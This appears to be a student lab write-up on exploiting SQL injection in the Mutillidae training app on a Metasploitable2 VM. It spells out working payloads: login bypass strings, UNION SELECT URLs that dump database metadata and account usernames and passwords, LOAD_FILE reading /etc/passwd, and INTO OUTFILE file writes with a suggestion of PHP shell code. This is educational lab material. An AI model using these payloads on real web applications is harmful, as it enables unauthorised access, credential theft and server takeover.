# EX.NO-08
# SQL Injection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 

```
Tested By : SAMUEL M
Register no.: 212222040142
```


Identify IP address using ifconfig in Metasploitable2
![img0](https://github.com/user-attachments/assets/516dd724-9d95-4720-b996-0dc498567de3)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![img1](https://github.com/user-attachments/assets/587f5fe3-eb19-4da5-9cd9-7b6b238c12be)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![img2](https://github.com/user-attachments/assets/534eb842-23e9-4cce-8cf7-5625349de2c6)

Click on the menu Login/Register and register for an account

![img3](https://github.com/user-attachments/assets/b3ff0ea0-0a0a-4c5b-addb-c36188ee0ed1)

Click on the link “Please register here”

![img4](https://github.com/user-attachments/assets/e80bf9bb-a91f-4056-9c4b-96d050465066)

Click on “Create Account” to display the following page:


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![img5](https://github.com/user-attachments/assets/81d48bee-dcdd-4bb9-ae49-68dafaacdec3)


Click “Login”. The logged in page will show as below:

![img6](https://github.com/user-attachments/assets/5b0db4c6-0286-41fa-a854-67d6f178c395)


## Bypassing login field

##### The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
##### =================================================================
If you face error in registration follow the following steps in metasploitable 2:

![img7](https://github.com/user-attachments/assets/190de3f2-afd0-43ea-a680-c3404360b894)


This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo vim /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once vim opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![img8](https://github.com/user-attachments/assets/3e376c01-cace-4217-a98e-804a0b0cc0e8)


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![img9](https://github.com/user-attachments/assets/d0c4c212-1461-4962-965e-9d6342780b88)


Save and exit the config.inc
Save than exit the config.inc file by typing :wq keys on your keyboard to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload

![img10](https://github.com/user-attachments/assets/a7792c32-d82b-43f0-86af-bdb425e69abb)


 Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![img11](https://github.com/user-attachments/assets/74c7d94e-e35b-427d-81dd-bb5a6138e87c)


Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 

![img12](https://github.com/user-attachments/assets/1fbc1da2-de3b-4e80-b0bc-9d651426a63b)

===============================================================

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![img13](https://github.com/user-attachments/assets/6b56a8a3-cf77-4698-83a9-66ab1232ff66)

Click the login button and you will see it enter into the administrator page.

![img14](https://github.com/user-attachments/assets/9c167d2f-ef11-43cf-9a0d-959605fafcc4)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:


![img15](https://github.com/user-attachments/assets/5d885414-ee29-492d-9224-b6ca1f64701d)

![img16](https://github.com/user-attachments/assets/412f4742-5d94-450f-9ce0-7f19d2e80b90)

![img17](https://github.com/user-attachments/assets/50fbb4ad-f472-4039-9032-a3b086d965c5)


![img18](https://github.com/user-attachments/assets/96b42931-c1b0-44b2-8d77-3d8c87493f8f)

![img19](https://github.com/user-attachments/assets/d76bab59-0c2f-4770-9e69-bfd4e2896d49)



From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.



![img20](https://github.com/user-attachments/assets/ae9db990-43a0-48f7-97ff-a9fd9882cd8c)




Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![img21](https://github.com/user-attachments/assets/1bf040cd-8cf9-4adc-a90d-262a13574046)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![img22](https://github.com/user-attachments/assets/42183a3c-cc07-4396-b99b-d51a161a42fd)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![img23](https://github.com/user-attachments/assets/22cc5635-28df-401c-8624-60aa58fa7501)

 As it is having 5 columns the query worked fine and it provides the correct result

![img24](https://github.com/user-attachments/assets/c6e3fa70-35a6-4d83-841c-7448316bae10)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

![img25](https://github.com/user-attachments/assets/507138ae-e7d3-48c9-af4a-8f7dea0eb8b2)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![img26](https://github.com/user-attachments/assets/82baf182-1d54-4913-89f9-a7e723e4daf9)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![img27](https://github.com/user-attachments/assets/ec56b284-7ac1-47b0-943d-224acbe2466e)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![img28](https://github.com/user-attachments/assets/fd4359b3-e141-4aa3-8f8d-11ebda07e98f)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.


![img29](https://github.com/user-attachments/assets/12099037-07e2-4da1-8a73-755f97bdc65e)




The column names of the accounts is displayed below for the following url:


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![img30](https://github.com/user-attachments/assets/33908b83-2970-46d4-88a6-f7b729563089)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![img31](https://github.com/user-attachments/assets/f30a4f76-b96b-4277-be7d-ac11b082e322)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![img32](https://github.com/user-attachments/assets/ecbeb9a1-440b-4e3e-af83-76cb535e1073)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.

